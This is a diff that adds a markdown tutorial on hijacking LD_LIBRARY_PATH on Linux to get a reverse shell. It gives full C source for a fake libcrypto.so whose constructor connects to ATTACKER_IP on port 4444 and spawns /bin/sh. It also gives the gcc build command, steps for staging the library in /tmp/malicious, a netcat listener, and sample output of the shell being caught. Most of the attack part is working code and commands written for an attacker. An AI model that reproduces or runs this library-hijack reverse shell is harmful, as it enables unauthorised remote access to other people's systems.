@@ -1,0 +1,127 @@
+Below is an example of how to exploit `LD_LIBRARY_PATH` modification to achieve a reverse shell on a Linux target. This method involves creating a malicious shared library that mimics a legitimate library (e.g., `libcrypto.so`), placing it in a custom directory, and manipulating the `LD_LIBRARY_PATH` environment variable to trick a target program into loading it.
+
+---
+
+### How It Works
+1. The `LD_LIBRARY_PATH` variable tells the dynamic linker (`ld.so`) to search `/tmp/malicious` for shared libraries before the default system paths (e.g., `/usr/lib`).
+2. When the target program runs, it loads your malicious `libcrypto.so` instead of the legitimate one.
+3. The constructor function `init()` in the malicious library executes immediately upon loading, establishing a reverse shell connection to your attacker machine.
+
+---
+
+
+### Finding a Suitable Target Library
+To ensure success, identify the libraries a target program depends on using `ldd`:
+
+```bash
+ldd /usr/bin/openssl
+```
+Output might include:
+```
+libcrypto.so.1.1 => /usr/lib/libcrypto.so.1.1
+```
+In this case, name your malicious library `libcrypto.so.1.1` to match the expected version.
+
+---
+
+### Limitations and Notes
+- **Privileges**: Requires the ability to set `LD_LIBRARY_PATH` and execute the target program. Setuid binaries ignore `LD_LIBRARY_PATH` unless exploited with root privileges.
+- **Library Naming**: The malicious library must match the exact name and version expected by the program (e.g., `libcrypto.so.1.1` vs. `libcrypto.so`).
+- **Firewall**: The target must allow outbound connections to your IP and port.
+- **Detection**: Modifying `LD_LIBRARY_PATH` or unusual network activity could be flagged by security tools.
+- **Cleanup**: Unset `LD_LIBRARY_PATH` after testing (`unset LD_LIBRARY_PATH`) to avoid affecting other programs.
+---
+
+### Prerequisites
+1. **Attacker Machine**: A system listening for the reverse shell (e.g., using `netcat`).
+2. **Target Machine**: A Linux system where you can modify `LD_LIBRARY_PATH` and execute a program that dynamically loads a library.
+3. **Compiler**: `gcc` to build the malicious shared library.
+4. **Target Program**: A program that loads a shared library (e.g., one using `libcrypto.so` or another common library).
+
+---
+
+### Step-by-Step Example
+
+#### 1. **Create the Malicious Shared Library**
+- Create a C file (e.g., `malicious_lib.c`) with the following code,- Replace `"ATTACKER_IP"` with your attacker machine’s IP address (e.g., `192.168.1.100`). The `__attribute__((constructor))` ensures the `init()` function runs when the library is loaded, spawning the reverse shell.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+void __attribute__((constructor)) init() {
+    // Create a socket
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in server;
+
+    // Configure the reverse shell target (attacker's IP and port)
+    server.sin_family = AF_INET;
+    server.sin_port = htons(4444);              // Port 4444
+    server.sin_addr.s_addr = inet_addr("ATTACKER_IP"); // Replace with attacker's IP
+
+    // Connect to the attacker's machine
+    connect(sock, (struct sockaddr *)&server, sizeof(server));
+
+    // Redirect stdin, stdout, and stderr to the socket
+    dup2(sock, 0); // stdin
+    dup2(sock, 1); // stdout
+    dup2(sock, 2); // stderr
+
+    // Execute a shell
+    execve("/bin/sh", NULL, NULL);
+}
+
+#### 2. **Compile the Malicious Library**
+Compile the code into a shared library, naming it to match a library the target program depends on (e.g., `libcrypto.so`):
+
+```bash
+gcc -shared -fPIC -o libcrypto.so malicious_lib.c
+```
+
+- `-shared`: Creates a shared library.
+- `-fPIC`: Generates position-independent code.
+- Use a name like `libcrypto.so` if the target program links against OpenSSL, or identify another library dependency using `ldd <target_program>`.
+
+#### 3. **Set Up a Malicious Directory**
+Move the compiled library to a directory you control (e.g., `/tmp/malicious`):
+
+```bash
+mkdir /tmp/malicious
+mv libcrypto.so /tmp/malicious/
+```
+
+#### 4. **Set Up the Listener on the Attacker Machine**
+On your attacker machine, start a `netcat` listener to catch the reverse shell:
+
+```bash
+nc -lvnp 4444
+```
+
+#### 5. **Modify LD_LIBRARY_PATH and Run the Target Program**
+On the target machine, set `LD_LIBRARY_PATH` to prioritize your malicious directory and run a program that loads the target library (e.g., `openssl` if targeting `libcrypto.so`):
+
+```bash
+export LD_LIBRARY_PATH=/tmp/malicious:$LD_LIBRARY_PATH
+openssl version  # Or any program that loads libcrypto.so
+```
+
+- Replace `openssl` with the actual program you’re targeting, identifiable via `ldd` (e.g., `ldd /usr/bin/openssl` to check dependencies).
+- The dynamic linker will load your malicious `libcrypto.so` from `/tmp/malicious` instead of the system version.
+
+#### 6. **Receive the Reverse Shell**
+On the attacker machine, your `netcat` listener should receive a connection, giving you a shell:
+
+```
+$ nc -lvnp 4444
+Listening on [0.0.0.0] (port 4444)
+Connection from [TARGET_IP] port 4444 [tcp/*] accepted
+whoami
+target_user
+```
+
+
+
+
+
